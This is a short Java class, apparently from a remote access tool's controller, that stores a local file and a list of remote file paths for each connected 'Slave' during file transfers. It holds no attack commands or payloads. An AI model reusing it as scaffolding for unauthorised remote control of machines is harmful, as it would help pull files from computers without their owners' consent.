package com.redpois0n;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import com.redpois0n.packets.incoming.Packet29ReceiveFile;


public class FileData {
	
	private File localFile;
	private List<String> remoteFiles = new ArrayList<String>();
	
	public FileData(Slave slave) {
		Packet29ReceiveFile.data.put(slave, this);
	}
	
	public File getLocalFile() {
		return localFile;
	}
	
	public void setLocalFile(File localFile) {
		this.localFile = localFile;
	}
	
	public List<String> getRemoteFiles() {
		return remoteFiles;
	}

}
